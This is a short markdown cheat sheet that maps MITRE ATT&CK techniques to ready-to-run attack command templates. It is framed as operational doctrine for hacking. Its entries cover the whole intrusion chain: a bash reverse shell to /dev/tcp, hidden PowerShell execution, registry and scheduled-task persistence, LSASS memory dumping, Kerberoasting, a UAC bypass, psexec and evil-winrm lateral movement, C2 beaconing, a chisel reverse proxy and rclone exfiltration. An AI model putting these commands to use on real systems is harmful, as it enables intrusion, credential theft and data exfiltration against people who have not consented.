# MITRE ATT&CK Tactic Lookup

> Operational Mapping: Tactic ID -> Terminal Command.
> **Philosophy**: "Do not just hack. Execute Doctrine."

| Tactic ID | Name | Command Template | Tool |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | | | |
| T1595 | Active Scanning | `nmap -sS -p- <target>` | Nmap |
| T1596 | Service Discovery | `amass enum -d <domain>` | Amass |
| **Initial Access** | | | |
| T1190 | Exploit Public App | `python3 exploit.py -t <target>` | Custom |
| T1566 | Phishing | `gophish --config config.json` | Gophish |
| **Execution** | | | |
| T1059.001 | PowerShell | `powershell -nop -w hidden -c <cmd>` | PowerShell |
| T1059.004 | Bash | `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` | Bash |
| **Persistence** | | | |
| T1547.001 | Registry Run Keys | `reg add HKCU\...\Run /v <name> /t REG_SZ /d <path>` | Reg.exe |
| T1053.005 | Scheduled Task | `schtasks /create /tn <name> /tr <path> /sc daily` | Schtasks |
| **Privilege Escalation** | | | |
| T1068 | Exploitation for Priv Esc | `compile_exploit.sh; ./pwn` | GCC/Exploit |
| T1548.002 | Bypass UAC | `fodhelper.exe` (Registry modification) | Built-in |
| **Credential Access** | | | |
| T1003.001 | LSASS Memory | `procdump.exe -ma lsass.exe lsass.dmp` | Procdump/Mimikatz |
| T1558.003 | Kerberoasting | `Rubeus.exe kerberoast` | Rubeus |
| **Discovery** | | | |
| T1087 | Account Discovery | `net user /domain` | Net.exe |
| T1046 | Network Service Scanning | `Invoke-Portscan -Hosts <CIDR>` | PowerSploit |
| **Lateral Movement** | | | |
| T1021.002 | SMB/Windows Admin Shares | `psexec.py domain/user:pass@<IP>` | Impacket |
| T1021.006 | Windows Remote Management | `evil-winrm -i <IP> -u <User> -p <Pass>` | Evil-WinRM |
| **Command and Control** | | | |
| T1071.001 | Web Protocols | `c2_agent --proto https --beacon 30s` | Covenant/Sliver |
| T1090 | Proxy | `chisel client <IP>:8000 R:socks` | Chisel |
| **Exfiltration** | | | |
| T1041 | Exfil over C2 Channel | `download <file>` | C2 Framework |
| T1567 | Exfil to Web Service | `rclone copy <data> remote:drive` | Rclone |
